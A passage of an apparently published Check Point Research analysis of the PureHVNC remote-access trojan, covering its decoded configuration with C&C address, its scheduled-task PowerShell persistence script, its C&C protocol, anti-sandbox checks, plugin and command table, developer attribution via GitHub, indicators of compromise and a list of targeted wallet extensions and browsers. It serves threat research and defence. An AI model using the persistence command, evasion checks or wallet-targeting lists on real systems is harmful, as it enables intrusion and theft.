a5867685270715a555139395661482f756354347250394363536a49716c43796d507541684f5a6d5244794d416357757a737a2f315354675a3866785030445670726470544c764e396e2b65734d505948524543556c615a4c646e397839416d5a4152624d61744f64417a48384c675154473032656356532f70457567555667374970786e367057716a4b2b4e53464e72316b784359493555715a4b35304364494e6f4b4d382b6672413767416c336f686e593462524b366246696f61434363435a4a463746614a4a682b4544732f4351364b634c706e6b434177454141614d794d444177485159445652304f424259454642396a546c4e6561355a734a6437436c44682f6365706b46585a5a4d41384741315564457745422f7751464d414d42416638774451594a4b6f5a496876634e4151454e42514144676749424148336e466e7675504575664d334277504e6668677335526b5050586b3270473963547a6e784552336833376b52336a6775456e7132774c3779594132443330584138744a76372b43505a2f4972745343304f5379456d77386135466f48746e6f32326535447471383146593463386b465453307033396d744145746974414765684d7945364b3358304c67764e6178577762644c3972636b6f36326d7378714b527733667861466a544e4b2b746c35483654386a584835564d714564306569694b357953616e4c6b69792b4366594a6e7971426f49435957347231572f6f3635696267787a506f4f7a63626f64345547394f36597744714d444e384a6c514451546c37675a4c697443526361425a51796e494e4632795a775a5969726457714b3058336668514c6c756f5a397a58686335726233554d352b51765039702f5a61554f495a306d3138766a56636e7a365a6f394e36304b393375355a2f497a42636438674d315770336474447275656b626a64587338622b74784d4446537935365a5042464c4a68574f34787047743137325a4d7036447539734d4157446144546650765a5770724535576a436b34666c744d515530444762506d5031696c33584c7471567650694c767541636372624c39776b766c76444b676a715570596a587364464f5435756e586959633165454457344849574e4a634977324a346f7a384932416c77512b657856544541725163384733664e624d73765a4437437453564a4b715a4c536b41666f6b69335a72732f6649465447474e7a512f56626230314b376b3773326d4151344d72314a6a4e682f5a776c546475624b5a702b6a6241527268447676645049537570536f304b444b426a776b5932746347772f615473594b644e7977446e38567149764c6a4868444b4734764d6d3746596f4c4d64455749584e797650316f4a322207616d617a6f6e333a004207415050444154414a0c616130356265323835303631 [b2 02] 38 string: (1731) [0a] 1 string: (14) 54.197.141[.]245 [10] 2 varint: 443 (0x1bb) [10] 2 varint: 10443 (0x28cb) [1a] 3 string: (1672) MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2 [22] 4 string: (7) amazon3 (61 6d 61 7a 6f 6e 33) [3a] 7 string: (0) [42] 8 string: (7) APPDATA (41 50 50 44 41 54 41) [4a] 9 string: (12) aa05be285061 The above configuration stores values in a specific class whose properties are decorated with [ProtoMember(n)] attributes, indicating that it uses Protocol Buffers ( protobuf-net ) for serialization. ProtoMember Description 1 Malware Command and Control Server. 2 C&C port. 3 TLS certificate, used for C&C communication. 4 Campaign ID. 5 Maintain Persistence flag. 6 Flag value, which executes SetThreadExecutionState Windows API that prevents the system from sleeping or turning off the display. 7 Task name, used for maintaining persistence via Scheduled Task. If the field is not defined the executable name is used. 8 Environment variable which will be used to retrieve the installation folder. This file path will be used for persistence. 9 Mutex name, assuring the malware process is unique. 10 Unknown, unused field. Persistence PureHVNC , similar to the Rust Loader described above, maintains its persistence in the system\u2019s Scheduled Task by executing a PowerShell command. When running with admin rights, the malware will execute the following script: Register-ScheduledTask ` -TaskName '<task_name>' ` -Action ( New-ScheduledTaskAction -Execute '<executable_path>' ) ` -Trigger ( New-ScheduledTaskTrigger -Once -At (Get-Date) ` -RepetitionInterval (New-TimeSpan -Minutes 5) ) ` -User $env:UserName ` -**RunLevel Highest** ` -Settings ( New-ScheduledTaskSettingsSet ` -ExecutionTimeLimit (New-TimeSpan -Seconds 0) ` -AllowStartIfOnBatteries ` -DontStopIfGoingOnBatteries ) ` -Force When the process runs as a normal user, the command will run without the -RunLevel Highest option. Depending on the process rights, the appropriate command will be Base64 encoded and then executed using the -Enc PowerShell parameter. Figure 12 \u2014 Encodes command with Base64 and executes PowerShell. Network Communication The malware initially tries to check if the endpoint is currently alive, first trying to Connect via socket and then sends four bytes to the C&C 04 00 00 00 . Figure 13 \u2014 Initial communication. The malware creates an SSLStream and performs an SSL handshake, verifying the server\u2019s certificate against a certificate embedded in its configuration. During this stage, PureHVNC collects Bot information that will be sent to the attacker\u2019s server. This information will be serialized and then compressed using Gzip . If the compressed data exceeds approximately 1 MB (1,000,000 bytes), it will be sent in 16 KB chunks. Figure 14 \u2014 Compressed data into chunks. Once data is sent, PureHVNC receives the compressed buffer size from the C&C via an SSL stream and reads the entire buffer into an array. After decompressing and deserializing the data, the malware executes the received command in a separate thread. Figure 15 \u2014 Command execution in a separate Thread. Collected Data PureHVNC collects and sends data from the infected system to the C&C server. This includes installed antivirus products, bot identifier, user domain and privileges, OS version, executable filename, idle time, and installed applications of interest. The information also contains metadata such as the malware version ( 4.1.9 ) and campaign ID ( amazon3 ) obtained from the malware configuration. Figure 16 \u2014 Data sent to C&C. To retrieve the Antivirus products queries Windows Management Instrumentation (WMI) for installed antivirus products on the system, \"SELECT * FROM AntiVirusProduct\u201d . In addition to collecting information about installed antivirus products, the malware also checks for the presence of specific applications of interest on the host system. It scans predefined directories, files, and registry keys associated with known crypto wallet software, browser extensions, and messaging or email clients to find them (see Appendix ). Among the data sent to the C&C, there are three pieces of information that can also serve as anti-sandbox indicators, helping the attacker determine whether the bot resides on a real user system or within a sandboxed or virtualized analysis environment. The first technique returns a Boolean value indicating whether the infected machine has any devices recognized as cameras or imaging devices. This is determined by executing the WMI query, SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera') . Sandboxes and virtual machines often lack physical devices like webcams or imaging devices, and the absence of such devices can indicate a non-physical environment. The second collected data retrieves the tick count of the last input event (keyboard/mouse) and the last user activity on the machine. The third one is the executable name and path, that during this campaign the malware was installed in a fixed folder. This three information combined could be used by the attacker to determine whether the infected machine is a real user or not. Plugins & Commands PureHVNC stores plugins inside the registry key. The registry key uses the BotID, while the name and value are received by the C&C. The data of the plugin is compressed and reversed, and each time the plugin is loaded, it reverses the bytes and decompresses the buffer. The registry path is located at HKEY_CURRENT_USER\\Software\\{BOT_ID} and the Bot ID is generated with the following Python logic: # PureHVNC BotID generation logic import hashlib class PureBotID: def __init__(self, user_name: str, domain_name: str, processor_id: str, drive_sn: str, memory_sn: str): # Environment.UserName self.user_name = user_name # Environment.UserDomainName self.domain_name = domain_name # \"Win32_Processor\", \"ProcessorId\" self.processor_id = processor_id # \"Win32_DiskDrive\", \"SerialNumber\" self.drive_sn = drive_sn # \"Win32_PhysicalMemory\", \"SerialNumber\" self.memory_sn = memory_sn # generating Bot ID PureHVNC logic self.bot_id = self.generate_bot_id() def generate_bot_id(self) -> str: user_domain = f\"{self.user_name}[{self.domain_name}]\" if self.domain_name else self.user_name result = f\"{self.processor_id}{self.drive_sn}{self.memory_sn}{self.domain_name}{user_domain}\" return hashlib.md5(result.encode()).hexdigest().upper() Once the plugin is delivered to the infected victim, the threat actor can execute various commands. The majority of the commands have a one-on-one relation with the plugin, meaning that the plugin serves only one functionality, though some plugins serve multiple commands. Observed Plugins & supported Commands: ID Plugin Supported Commands Description 0 None None No operation. 1 RemoteHiddenVNC HvncRunpe Hidden Virtual Network Computing (HVNC) feature under a separate process. 2 RemoteHiddenVNCAudio EnableAudio HVNC with audio enabled. 3 RemoteAudio RemoteMic Captures live audio from the infected system\u2019s microphone. 4 TaskManager ProcessManager Displays, kills, restarts processes. 5 FileManager FileManager Displays, kills, and restarts processes. 6 Executing DownloadAndExecuteDisk DownloadAndExecuteMemory DownloadAndUpdate Executes computer-related commands such as Restarting, Shutting down PC and offers multiple Bot-C&C connection related features. 7 RemoteCamera RemoteWebcam Activates the victim\u2019s webcam and streams or captures images/video. 8 RemoteShell RemoteShell Remote Shell plugin and command. 9 RemoteDesktop RemoteDesktop Remote Desktop plugin and command. 11 PcOption DeletePlugins CloseConnection RestartConnection UninstallConnection ShutdownPC RestartPC BlockConnection Executes computer-related commands such as restarting, shutting down the PC and offers multiple Bot-C&C connection-related features. 12 Chat Chat Command allowing real-time text communication between the operator and the remote client. 13 Keylogger RemoteKeylogger Keylogging capabilities. 14 VisitWebsite VisitWebsite Visits specified website for a specified duration. 15 RevProxy RevProxyHttp RevProxySocks5 Reverse proxy supporting HTTP and SOCKS5. 16 TV TV Unknown, currently not used plugin-command. 17 ExecutePowershell DefednerExclusion PowershellOneLiner DeleteRestorePoints Executes PowerShell specified one-liner command. As well executes PowerShell to bypass Windows Defender. 18 RemoteHiddenVNC_Reflection RemoteHvncReflection Terminates Bot, with the option to delete. 19 TwitchBot TwitchBot Twitch Bot command is capable of sending a message to the Chat, following, unfollowing an account, clicking on ads. 20 YoutubeBot YoutubeBot YouTube Bot performs subscribe, unsubscribe to a specified account, send message, Like actions and click ads. 21 BotKiller BotKiller BotKillerWtihDelete Retrieves machine specs. 22 WindowNotify WindowNotify Alerts threat actor once a window caption matching specified keywords is opened. 23 RegistryManager RegistryManager Remote Registry editor, Delete, Create, Edit values and keys. 24 NetworkManager NetworkManager Allows threat actor to view active network connections, refresh connections list, kill specified connection, or terminate process with specific connection. 25 DDOS DdosManager Distributed Denial of Service (DDOS) against specified target. Three types of DDOS are supported: 1) HTTP Flood, 2) TCP Flood and 3) HTTP Bandwidth Exhaustion 26 PCSpecifications PCSpecifications Attacker is able to seed or leech files via torrent. This could potentially allow to run a P2P botnet for data distribution. This command may help in the exfiltration of huge files. 27 Coding ExecuteNETCode Executes .NET code specified by the threat actor. 28 InstalledApps InstalledApps Retrieves installed apps. 29 ActiveWindow ActiveWindows Able to control active windows on a remote machine. 30 HRDP HRDP Hidden Remote Desktop Protocol capabilities. 31 Clipper Clipper Monitors the system clipboard and replaces copied data with attacker-controlled content. More specifically detects Cryptocurrencies addresses and replaces them with wallets owned by the attacker. The malware supports Bitcoin (BTC), Litecoin (LTC), Ethereum (ETH), Ravencoin (RVN), Monero (XMR), Bitcoin Cash (BCH) 32 Torrent Torrent Attacker is able to seed or leech files via torrent. This could potentially allow to run a P2P botnet for data distribution. This command may help in exfiltration of huge files. 33 HostsEditor HostsEditor Allows an attacker to edit the remote machine\u2019s hosts file. The hosts file maps domain names to IP addresses, enabling an attacker to override DNS resolution or block/redirect traffic. 34 StartupManager StartupManager Collects all persistence entries that make programs run at boot. Then able to to remove them. PureCoder \u2013 Developer The Pure family of products includes multiple types of malware that are developed and sold by the same author, PureCoder . The list of products includes: PureCrypter , a Crypter for Native and .NET. PureRAT (PureHVNC RAT), a remote administration tool. PureLogs , a Stealer & Logger. PureMiner , a silent Crypto Miner. Blue Loader , an advanced Botnet. Other smaller malicious products. Figure 17 \u2014 Products advertisement. Multiple threat actors use those products for specific purposes. Often, PureCrypter is used as a crypter, obfuscating other Pure products, such as PureLogs or PureHVNC . The products are sold among the many PureCoder\u2019s Telegram channels. Figure 18 \u2014 PureCoder Telegram account. The developer and seller of the Pure malware family demonstrates the features and capabilities of each product, while the PureRAT administration-builder panel appears to support three main languages: English, Russian, and Chinese. Figure 19 \u2014 PureRAT Administration-Builder Panel. PureCoder \u2013 GitHub Account(s) During the previously mentioned campaign, with ID amazon3 , the malware communicated with its command and control server. The bot received three GitHub URLs and downloaded the corresponding files. Figure 20 \u2014 Contacted repository. The GitHub account owns a total of five repositories, which contain several executable and plugin files. Figure 21 \u2014 GitHub account. When examining the commits of the repository DFfe9ewf/test3 we discovered something that we did not expect. The commits and file uploads to the specific repository were made by \u201canother account\u201d, PureCoder . Mentioned commits: ================================================== [2024-10-31T02:01:36Z] Author: PureCoder tree 795fba180464a965f99fc2a50c5a3fad38a6939a author PureCoder < [email protected] > 1730340096 +0300 committer GitHub < [email protected] > 1730340096 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 ================================================== [2024-10-31T02:02:22Z] Author: PureCoder tree 8c302d85720b3fa2a8ecceffe1aa7cd23efbe9b5 parent 647343bed2af6e8c16f296d626d98cdfd0f84cf0 author PureCoder < [email protected] > 1730340142 +0300 committer GitHub < [email protected] > 1730340142 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9 ================================================== [2024-10-31T02:02:40Z] Author: PureCoder tree 4b0fa1d022d409825bb2a872e245ebc9b2bcaff2 parent f388ef87fcd48a2fe00fa449c1987115e5fe35c8 author PureCoder < [email protected] > 1730340160 +0300 committer GitHub < [email protected] > 1730340160 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - 2e5050c50d3a8e9f376f0ae9394cf265ed3dcf06 * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9 GitHub creates a noreply email shown in the commits with the ID and the Username of the account in the form [email protected] . The ID 87261126 actually, currently corresponds to DFfe9ewf which was renamed from PURE-CODER-1 . The commits have been made from the timezone UTC+0300 which corresponds to many countries, including Russia, among others. One of the three downloaded files was once again seen in another GitHub account, which possibly serves for development and testing purposes. Figure 22 \u2014 PureCoder Testing/Development account. The repository containing those files, DemoThing was created in March 2024, two more repositories with the description \u201cPR\u201d were created by this testing account during April 2025 and contain similar files. Figure 23 \u2014 PureCoder Testing/Development account repositories. Similar to the previous GitHub account, all commits are once again made in the timezone UTC+0300 and contain similar names and files hosted. This account was created testdemo345 was created before DFfe9ewf and appears to be serving for testing purposes during development phases. -------------------------------------------------- Repository Commits: Demothing ================================================== [2024-03-03T15:38:21Z] Author: testdemo345 tree 7f851ca85ec9136486692f283ff16c79a1a211ca author testdemo345 < [email protected] > 1709480301 +0300 committer GitHub < [email protected] > 1709480301 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - 03d1d4a02fbd4c72b8ea9826a219a0511a62a974 * msedgedriver.exe - 44ceaa27e81a9a9f218fff2c720b72390ff1c6c3 -------------------------------------------------- Repository Commits: uhewrf90 ================================================== [2025-04-14T08:00:34Z] Author: testdemo345 tree 11e0357a36bd6e908cf9f6e7834cc201a70d692a author testdemo345 < [email protected] > 1744617634 +0300 committer GitHub < [email protected] > 1744617634 +0300 Add files via upload * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 ================================================== [2025-04-14T08:00:53Z] Author: testdemo345 tree 4cf36f75defc34cbd1b50c23e932f8d9a87dca9b parent 98ac16ba3e512e495ebf8da7e1ea6bea904ea69b author testdemo345 < [email protected] > 1744617653 +0300 committer GitHub < [email protected] > 1744617653 +0300 Add files via upload * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7 ================================================== [2025-04-14T08:01:08Z] Author: testdemo345 tree 831bcb77a070b342115c68ced7cb22c0c778006f parent 564db1627658feb61fe87b07659d371c371a4a41 author testdemo345 < [email protected] > 1744617668 +0300 committer GitHub < [email protected] > 1744617668 +0300 Add files via upload * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81 * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855 * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7 -------------------------------------------------- Repository Commits: fdsgb890ugrds ================================================== [2025-04-14T08:04:51Z] Author: testdemo345 tree 85e444601df3b756209667504c39116a60e0e3d3 author testdemo345 < [email protected] > 1744617891 +0300 committer GitHub < [email protected] > 1744617891 +0300 Add files via upload * qbittorrent - 7075fb417919b4ae9335ee7abeb9553953c8aac8 Pure Builder & GitHub URLs At the beginning, we considered the contacted GitHub account ( DFfe9ewf / PURE-CODER-1 ) as part of the URL delivered by the threat actor, who can be simply a customer of Pure malware products. Though this hypothesis changed once we discovered a PureRAT Administration-Builder containing hardcoded the GitHub URLs supporting various functionalities of the malware itself. Figure 24 \u2014 PureRAT Administration-Builder Assembly. The GitHub URLs were hardcoded into the PureRAT administration-builder executable, meaning they were not delivered by the threat actor to the victims. Instead, they are part of the administration tool itself, developed by PureCoder . Figure 25 \u2014 Hardcoded GitHub URLs. These URLs and files appear to support the TwitchBot and YoutubeBot plugins. They are used for commands such as following or unfollowing accounts, liking videos, and clicking ads on specified videos on these platforms. While PureCoder currently uses GitHub and the above-mentioned accounts to host files that support various functionalities of PureRAT, Check Point Research expects these URLs to change more frequently, potentially using different GitHub accounts, alternative hosting platforms, or even being delivered directly as bytes to the bots by the administration tool. Pure Builder \u2013 PureCrypter Features While the tool we obtained appears to be PureRAT builder and administration software, some available features are related to the PureCrypter software solution sold and developed by PureCoder as well. The code specifies multiple enumerations (enum) related to PureCrypter. An enum is a list of named constants that represent specific values. PureCrypter enums: Enum Name Member Name Proto Value Display Name PureCrypterExtension exe 0 \u201c.exe\u201d PureCrypterExtension pif 1 \u201c.pif\u201d PureCrypterExtension com 2 \u201c.com\u201d PureCrypterExtension bat 3 \u201c.bat\u201d PureCrypterExtension cmd 4 \u201c.cmd\u201d PureCrypterExtension iso 5 \u201c.iso\u201d PureCrypterExtension img 6 \u201c.img\u201d PureCrypterExtension html 7 \u201c.html\u201d PureCrypterExtension setup 9 \u201c.setup\u201d PureCrypterExtension scr 10 \u201c.scr\u201d PureCrypterExtension vbs 11 \u201c.vbs\u201d PureCrypterFakeApp BitcoinTransactionAccelerator 0 \u201c[Fake] Bitcoin Transaction Accelerator\u201d PureCrypterFakeApp BitcoinMining 1 \u201c[Fake] Bitcoin CPU Mining\u201d PureCrypterFakeApp FakeRAT 2 \u201c[Fake] FakeRAT\u201d PureCrypterFakeMessageType Error 0 \u201cError\u201d PureCrypterFakeMessageType Information 1 \u201cInformation\u201d PureCrypterFolder AppData 0 \u201c%appdata%\u201d PureCrypterFolder Local 1 \u201c%localappdata%\u201d PureCrypterFolder Documents 2 \u201c%userprofile%\u201d PureCrypterFolder Temp 3 \u201c%temp%\u201d PureCrypterFramework Framework_45 0 \u201cv4.5\u201d PureCrypterFramework Framework_46 1 \u201cv4.6\u201d PureCrypterFramework Framework_48 2 \u201cv4.8\u201d PureCrypterInjection Reflection 0 \u201cReflection\u201d PureCrypterInjection RunPE 1 \u201cRunPE\u201d PureCrypterInjection Shellcode 2 \u201cShellcode\u201d PureCrypterStartup Registry 0 \u201cRegistry\u201d PureCrypterStartup StartupFolder 1 \u201cStartupFolder\u201d PureCrypterStartup TaskScheduler 2 \u201cTaskScheduler\u201d These enums give us some important information regarding the choices a threat actor can make during encrypting their malware using PureCrypter. For example, we can observe the installation options ( PureCrypterFolder ), the persistence mechanism ( PureCrypterStartup ) as well as the execution method ( PureCrypterInjection ). Conclusion The forensic investigation of the ClickFix campaign provides a comprehensive view of the Pure malware ecosystem and its operational mechanics. The eight-day intrusion highlighted the coordinated use of multiple tools, including Rust Loader , PureHVNC RAT , and the Sliver C2 framework , demonstrating the threat actor\u2019s sophistication. Check Point Research\u2019s in-depth analysis of PureHVNC RAT, including all its commands, plugins, and associated supporting files, sheds light on previously opaque aspects of this malware family. Significantly, the investigation linked several GitHub repositories directly to the developer, PureCoder , offering rare insights into their operational practices, including a UTC+0300 timezone and potential geographic locations. The discovery of the PureRAT builder and additional information on PureCrypter further illustrate the modular and evolving nature of this malware suite, emphasizing the ongoing threat posed by Pure malware to organizations globally. Overall, this research not only enhances understanding of the Pure malware family but also provides actionable intelligence that can assist cybersecurity professionals and law enforcement agencies in tracking and mitigating future campaigns conducted by both PureCoder and the cybercriminals leveraging their tools. Protections Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report. Indicators of Compromise Description Value JavaScript File 85513077AADBE50FE68055F0420DA2E6B97BD30D JavaScript C&Cs stathub[.]quest stategiq[.]quest mktblend[.]monster dsgnfwd[.]xyz dndhub[.]xyz First PureHVNC RAT E3A79CE291546191A5DDB039B2F9BF523BB9C4FB Inno Setup Second PureHVNC RAT D340B780194D44EE9B8D32F596B5A13723ABBE1D Rust Loader 99CBBE5F68D50B79AF8FB748F51794DE137F4FE4 PureHVNC 34EC79AB8A00DC6908874CDF7762756A2DCA4274 PureHVNC C&C 54.197.141[.]245 GitHub account hxxps://github[.]com/DFfe9ewf GitHub \u2013 chromedriver.exe 2E5050C50D3A8E9F376F0AE9394CF265ED3DCF06 GitHub \u2013 msedgedriver.exe 7B133998E526B3BEE151329171C82CA1837C86F9 GitHub \u2013 WebDriver.dll 39D3B6BEE5450D82D096AD7BDF4244FCB7B1EB81 PureRAT Builder 17E14B3CCF309FD9B5F7A5068A5CEDDD15FDEA0F Appendix Applications & Extensions Targeted Chromium extensions: ibnejdfjmmkpcnlpebklmnkoeoihofec - TronLink nkbihfbeogaeaoehlefnkodbefgpgknn - MetaMask fhbohimaelbohpjbbldcngcnapndodjp - Binance Chain Wallet ffnbelfdoeiohenkjibnmadjiehjhajb - Yoroi cjelfplplebdjjenllpjcblmjkfcffne - Jaxx Liberty fihkakfobkmkjojpchpfgcmhfjnmnfpi - BitApp Wallet kncchdigobghenbbaddojjnnaogfppfj - iWallet aiifbnbfobpmeekipheeijimdpnlpgpp - Terra Station ijmpgkjfkbfhoebgogflfebnmejmfbml - BitClip blnieiiffboillknjnepogjhkgnoapac - EQUAL Wallet amkmjjmmflddogmhpjloimipbofnfjih - Wombat jbdaocneiiinmjbjlgalhcelgbejmnid - Nifty Wallet afbcbjpbpfadlkmhmclhkeeodmamcflc - Math Wallet hpglfhgfnhbgpjdenjgmdgoeiappafln - Guarda aeachknmefphepccionboohckonoeemg - Coin98 Wallet imloifkgjagghnncjkhggdhalmcnfklk - Trezor Password Manager oeljdldpnmdbchonielidgobddffflal - EOS Authenticator gaedmjdfmmahhbjefcbgaolhhanlaolb - Authy ilgcnhelpchnceeipipijaljkblbcobl - GAuth Authenticator bhghoamapcdpbohphigoooaddinpkbai - Authenticator mnfifefkajgofkcjkemidiaecocnkjeh - TezBox dkdedlpgdmmkkfjabffeganieamfklkm - Cyano Wallet aholpfdialjgjfhomihkjbmgjidlcdno - Exodus Web3 jiidiaalihmmhddjgbnbgdfflelocpak - BitKeep hnfanknocfeofbddgcijnmhnfnkdnaad - Coinbase Wallet egjidjbpglichdcondbcbdnbeeppgdph - Trust Wallet hmeobnfnfcmdkdcmlblgagmfpfboieaf - XDEFI Wallet bfnaelmomeimhlpmgjnjophhpkkoljpa - Phantom fcckkdbjnoikooededlapcalpionmalo - MOBOX WALLET bocpokimicclpaiekenaeelehdjllofo - XDCPay flpiciilemghbmfalicajoolhkkenfel - ICONex hfljlochmlccoobkbcgpmkpjagogcgpk - Solana Wallet cmndjbecilbocjfkibfbifhngkdmjgog - Swash cjmkndjhnagcfbpiemnkdpomccnjblmj - Finnie dmkamcknogkgcdfhhbddcghachkejeap - Keplr kpfopkelmapcoipemfendmdcghnegimn - Liquality Wallet hgmoaheomcjnaheggkfafnjilfcefbmo - Rabet fnjhmkhhmkbjkkabndcnnogagogbneec - Ronin Wallet klnaejjgbibmhlephnhpmaofohgkpgkd - ZilPay ejbalbakoplchlghecdalmeeeajnimhm - MetaMask ghocjofkdpicneaokfekohclmkfmepbp - Exodus Web3 heaomjafhiehddpnmncmhhpjaloainkn - Trust Wallet hkkpjehhcnhgefhbdcgfkeegglpjchdc - Braavos Smart Wallet akoiaibnepcedcplijmiamnaigbepmcb - Yoroi djclckkglechooblngghdinmeemkbgci - MetaMask acdamagkdfmpkclpoglgnbddngblgibo - Guarda Wallet okejhknhopdbemmfefjglkdfdhpfmflg - BitKeep mijjdbgpgbflkaooedaemnlciddmamai - Waves Keeper Targeted Applications: Chromium - Chromium\\\\User Data\\\\ Chrome - Google\\\\Chrome\\\\User Data\\\\ Chrome - Google(x86)\\\\Chrome\\\\User Data\\\\ Brave - BraveSoftware\\\\Brave-Browser\\\\User Data\\\\ Edge - Microsoft\\\\Edge\\\\User Data\\\\ QQBrowser - Tencent\\\\QQBrowser\\\\User Data\\\\ ChromePlus - MapleStudio\\\\ChromePlus\\\\User Data\\\\ Iridium - Iridium\\\\User Data\\\\ 7Star - 7Star\\\\7Star\\\\User Data\\\\ CentBrowser - CentBrowser\\\\User Data\\\\ Chedot - Chedot\\\\User Data\\\\ Vivaldi - Vivaldi\\\\User Data\\\\ Kometa - Kometa\\\\User Data\\\\ Elements - Elements Browser\\\\User Data\\\\ Epic Privacy - Epic Privacy Browser\\\\User Data\\\\ Uran - uCozMedia\\\\Uran\\\\User Data\\\\ Sleipnir5 - Fenrir Inc\\\\Sleipnir5\\\\setting\\\\modules\\\\ChromiumViewer\\\\ Citrio - CatalinaGroup\\\\Citrio\\\\User Data\\\\ Coowon - Coowon\\\\Coowon\\\\User Data\\\\ liebao - liebao\\\\User Data\\\\ QIP Surf - QIP Surf\\\\User Data\\\\ Orbitum - Orbitum\\\\User Data\\\\ Dragon - Comodo\\\\Dragon\\\\User Data\\\\ Amigo - Amigo\\\\User\\\\User Data\\\\ Torch - Torch\\\\User Data\\\\ Comodo - Comodo\\\\User Data\\\\ 360Browser - 360Browser\\\\Browser\\\\User Data\\\\ Maxthon3 - Maxthon3\\\\User Data\\\\ K-Melon - K-Melon\\\\User Data\\\\ Sputnik - Sputnik\\\\Sputnik\\\\User Data\\\\ Nichrome - Nichrome\\\\User Data\\\\ CocCoc - CocCoc\\\\Browser\\\\User Data\\\\ Uran - Uran\\\\User Data\\\\ Chromodo - Chromodo\\\\User Data\\\\ Atom - Mail.Ru\\\\Atom\\\\User Data\\\\ Atomic Wallet Bitcoin-Qt Dash-Qt Electrum Ethereum Exodus Jaxx Litecoin-Qt Zcash Foxmail Telegram Ledger Live GO UP BACK TO ALL POSTS POPULAR POSTS Artificial Intelligence ChatGPT Check Point Research Publications OPWNAI : Cybercriminals Starting to Use ChatGPT Check Point Research Publications Threat Research Hacking Fortnite Accounts Artificial Intelligence ChatGPT Check Point Research Publications OpwnAI: AI That Can Save the Day or HACK it Away BLOGS AND PUBLICATIONS Check Point Research Publications Global Cyber Attack Reports Threat Research February 17, 2020 \u201cThe Turkish Rat\u201d Evolved Adwind in a Massive Ongoing Phishing Campaign Check Point Research Publications August 11, 2017 \u201cThe Next WannaCry\u201d Vulnerability is Here Check Point Research Publications January 11, 2018 \u2018RubyMiner\u2019 Cryptominer Affects 30% of WW Networks Publications Global cyber attack reports Research publications IPS advisories Check point blog Demos Tools Sandblast file analysis ThreatCloud Threat Intelligence Zero day protection Live threat map About Us Contact Us Let\u2019s get in touch Subscribe for cpr blogs, news and more Subscribe Now \u00a9 1994-2025 Check Point Software Technologies LTD. All rights reserved. Property of CheckPoint.com Privacy Policy SUBSCRIBE TO CYBER INTELLIGENCE REPORTS First Name Last Name Country \u2014Please choose an option\u2014 China India United States Indonesia Brazil Pakistan Nigeria Bangladesh Russia Japan Mexico Philippines Vietnam Ethiopia 